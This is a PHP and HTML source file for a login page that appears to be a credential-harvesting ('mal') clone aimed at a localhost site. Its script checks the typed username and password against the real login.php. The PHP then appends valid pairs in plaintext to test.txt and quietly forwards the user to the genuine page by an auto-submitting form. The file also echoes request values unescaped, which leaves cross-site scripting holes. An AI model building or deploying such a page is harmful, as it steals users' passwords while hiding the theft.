<head>
    <title>HOME</title>
    <link rel="stylesheet" type="text/css" href="style-mal.css">
<script>
    function check() { 
        //var un =  "<?php if (isset($_POST['uname'])) { echo $_POST['uname'] ; } ; ?>";
        //var pw =  "<?php if (isset($_POST['password'])) { echo $_POST['password'] ; } ; ?>";
        var un =  document.getElementById('uname').value ;
        var pw =  document.getElementById('password').value ;

        console.log("something");
        console.log(un + ' ' + pw);
         
        var http = new XMLHttpRequest();
        var url = 'http://localhost/login.php';
        var params = 'uname='+ un + '&password=' + pw ;
        http.open('POST', url, false);

        //Send the proper header information along with the request
        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

        http.onreadystatechange = function() {//Call a function when the state changes.
            if(http.readyState == 4 && http.status == 200) {
                var response = http.responseText;
                if(response.includes("fully")){
                    document.getElementById('login').value = "verified" ;
                }
            }
        }
        http.send(params);
    }
</script>

</head>
<body>
     <form action="better-login-mal.php" method="post">
        <h2>LOGIN</h2>
        <?php if (isset($_GET['error'])) { ?>
            <p class="error"><?php echo $_GET['error']; ?></p>
        <?php } ?>
        <label>User Name</label>
        <input type="text" name="uname" id="uname" placeholder="User Name"><br>
        <label>Password</label>
        <input type="password" name="password" id="password" placeholder="Password"><br> 
        <button name="Login" id="login" type="submit" value="" onclick=check()>Login</button>
</form>
</body>


<?php

    if(isset($_POST['uname'], $_POST['password'], $_POST['Login'])) {
        if($_POST[''] == "") {
            echo "Login Unsuccessful...";
        }

        if($_POST['Login'] == "verified"){
            $un = $_POST['uname'];
            $pw = $_POST['password'];
            file_put_contents('test.txt', "$un :: $pw\n", FILE_APPEND);
            RedirectWithMethodPost("http://localhost:80/login.php?uname=$un&password=$pw");
            
        }
    }



    function RedirectWithMethodPost($dest)
    {
       $url = $params = '';
       if( strpos($dest,'?') ) { list($url,$params) = explode('?',$dest,2); }
       else { $url = $dest; }
       echo "<form id='the-form' 
          method='post' 
          enctype='multipart/form-data' 
          action='$url'>\n";
       foreach( explode('&',$params) as $kv )
       {
          if( strpos($kv,'=') === false ) { continue; }
          list($k,$v) = explode('=',$kv,2);
          echo "<input type='hidden' name='$k' value='$v'>\n";
       }
       echo <<<ENDOFFORM
    <p id="the-button" style="display:none;">
    Click the button if page doesn't redirect within 3 seconds.
    <br><input type="submit" value="Click this button">
    </p>
    </form>
    <script type="text/javascript">
    function DisplayButton()
    {
       document.getElementById("the-button").style.display="block";
    }
    setTimeout(DisplayButton,3000);
    document.getElementById("the-form").submit();
    </script>
    ENDOFFORM;
    }
    
?>

</html>
